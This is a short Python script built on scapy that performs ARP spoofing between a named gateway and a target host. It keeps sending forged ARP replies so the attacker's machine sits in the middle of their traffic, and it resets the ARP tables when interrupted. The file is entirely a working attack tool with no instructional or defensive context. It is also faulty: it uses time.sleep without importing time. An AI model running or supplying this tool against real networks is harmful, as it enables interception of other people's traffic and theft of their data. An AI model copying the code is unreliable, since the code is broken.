#!/usr/bin/env python3

import scapy.all as scapy
import argparse

def get_argument():
	parser = argparse.ArgumentParser()
	parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
	parser.add_argument("-s", "--spoof", dest="spoof", help="Spoofed IP")
	options = parser.parse_args()
	if not options.gateway:
		parser.error("[-] Please specify Gateway's IP, use -h or --help for more info.")
	if not options.spoof:
		parser.error("[-] Please specify a new spoofed IP you want, use -h or --help for more info.")
	return options


def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_packets = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered_packets[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)
	
def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)
	
sent_packets = 0
options = get_argument()
try:
	while True:
		spoof(options.gateway,options.spoof)
		spoof(options.spoof, options.gateway)
		sent_packets+=2
		print("\r[+] Sent packets: "+str(sent_packets), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[+] Resetting ARP tables...")
	restore(options.gateway,options.spoof)
	restore(options.spoof, options.gateway)
